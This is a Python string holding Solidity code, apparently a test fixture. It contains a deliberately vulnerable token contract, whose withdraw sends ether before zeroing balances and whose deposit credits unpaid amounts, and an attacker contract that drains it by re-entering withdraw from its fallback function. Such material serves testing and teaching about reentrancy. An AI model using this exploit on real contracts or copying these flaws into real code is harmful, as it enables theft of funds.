reentry_attack_str = """
contract BrokenToken { mapping(address => uint) public balanceOf; uint public totalSupply; function deposit(uint amount) payable{ balanceOf[msg.sender] += amount; totalSupply += amount; } function transfer(address to, uint value) payable{ if (balanceOf[msg.sender] >= value) { balanceOf[to] += value; balanceOf[msg.sender] -= value; } } function withdraw() payable{ uint balance = balanceOf[msg.sender]; if (msg.sender.call.value(balance)()) { balanceOf[msg.sender] = 0; totalSupply -= balance; } } }

contract EvilRecipient {
  address a = %(address)s;
  function callWithdraw() {
    BrokenToken token = BrokenToken(a);
    token.withdraw();
  }

  function callDeposit() payable {
    BrokenToken token = BrokenToken(a);
    token.deposit.value(1000000000000000000)(1000000000000000000);
  }

  function() payable{
    if (msg.gas > 1000000) {
      BrokenToken token = BrokenToken(msg.sender);
      token.withdraw();
    }
  }
}
"""
